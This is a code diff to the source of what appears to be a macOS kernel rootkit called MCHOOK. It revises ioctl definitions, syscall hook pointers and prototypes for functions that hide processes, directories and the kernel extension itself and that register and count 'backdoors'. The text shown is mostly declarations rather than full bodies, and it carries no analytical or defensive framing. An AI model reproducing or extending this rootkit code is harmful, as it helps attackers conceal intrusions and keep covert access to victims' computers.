@@ -53,9 +53,11 @@
 // Unregister userspace component
 #define MCHOOK_UNREGISTER   _IOW(MCHOOK_MAGIC, 5739299, char [MAX_USER_SIZE]) // IN:username
 // Returns the number of active backdoors
-#define MCHOOK_GET_ACTIVES  _IOR(MCHOOK_MAGIC, 7489827, int)
+#define MCHOOK_GET_ACTIVES  _IOR(MCHOOK_MAGIC, 7489827, int) // OUT: num of bd
 // Pass symbols resolved from uspace to kspace (not exported symbol snow)
-#define MCHOOK_SOLVE_SYM    _IOW(MCHOOK_MAGIC, 6483647, struct symbols) // IN:symbol_t
+//#define MCHOOK_SOLVE_SYM    _IOW(MCHOOK_MAGIC, 6483647, struct symbol) // IN:symbol_32_t
+#define MCHOOK_SOLVE_SYM_32 _IOW(MCHOOK_MAGIC, 6483647, struct symbol_32)
+#define MCHOOK_SOLVE_SYM_64 _IOW(MCHOOK_MAGIC, 6483648, struct symbol_64)
 // Tell the kext to find sysent
 #define MCHOOK_FIND_SYS     _IOW(MCHOOK_MAGIC, 4548874, struct os_version) // IN:os_version_t
 
@@ -134,7 +136,7 @@ void (*i_proc_list_unlock)(void)          = NULL;
 static int fl_getdire           = 0;
 static int fl_getdire64         = 0;
 static int fl_getdirentriesattr = 0;
-static int fl_kill              = 0;
+//static int fl_kill              = 0;
 //static int fl_shutdown          = 0;
 //static int fl_reboot            = 0;
 
@@ -151,19 +153,20 @@ static int cdev_ioctl (dev_t, u_long, caddr_t, int, struct proc *);
 #ifdef DEBUG
 void getAttributesForBitFields    (attr_list_t al);
 #endif
-int  check_for_process_exclusions (pid_t pid);
-void dealloc_meh                  (char *, pid_t);
-void place_hooks                  ();
-void remove_hooks                 ();
-void add_dir_to_hide              (char *, pid_t);
-void hide_kext_leopard            ();
-int  hide_proc                    (proc_t, char *, int);
-int  unhide_proc                  (proc_t, int);
-int  unhide_all_procs             ();
-int  get_backdoor_index           (proc_t, char *);
-int  check_symbols_integrity      ();
-void backdoor_init                (char *, proc_t);
-int  remove_dev_entry             ();
+int     check_for_process_exclusions (pid_t pid);
+void    dealloc_meh                  (char *, pid_t);
+void    place_hooks                  ();
+void    remove_hooks                 ();
+void    add_dir_to_hide              (char *, pid_t);
+void    hide_kext_leopard            ();
+int     hide_proc                    (proc_t, char *, int);
+int     unhide_proc                  (proc_t, int);
+int     unhide_all_procs             ();
+int     get_active_bd_index          (char *, pid_t);
+int     get_bd_index                 (char *, pid_t);
+int     check_symbols_integrity      ();
+Boolean backdoor_init                (char *, proc_t);
+int     remove_dev_entry             ();
 static struct sysent *find_sysent (os_version_t *);
 
 #pragma mark -
@@ -184,7 +187,7 @@ int  hook_getdirentries             (struct proc *,
 int  hook_getdirentries64           (struct proc *,
                                      struct mk_getdirentries64_args *,
                                      int *);
-int hook_getdirentriesattr          (struct proc *p,
+int hook_getdirentriesattr          (struct proc *,
                                      struct mk_getdirentriesattr_args *uap,
                                      int *retval);
 /*
@@ -222,9 +225,13 @@ typedef int reboot_func_t           (struct proc *,
                                      int *);
 */
 //static read_func_t              *real_read;
-static kill_func_t              *real_kill;
+//static kill_func_t              *real_kill;
 static getdirentries_func_t     *real_getdirentries;
 static getdirentries64_func_t   *real_getdirentries64;
 static getdirentriesattr_func_t *real_getdirentriesattr;
 //static shutdown_func_t          *real_shutdown;
 //static reboot_func_t            *real_reboot;
+
+int is_leopard();
+int is_snow_leopard();
+int is_lion();
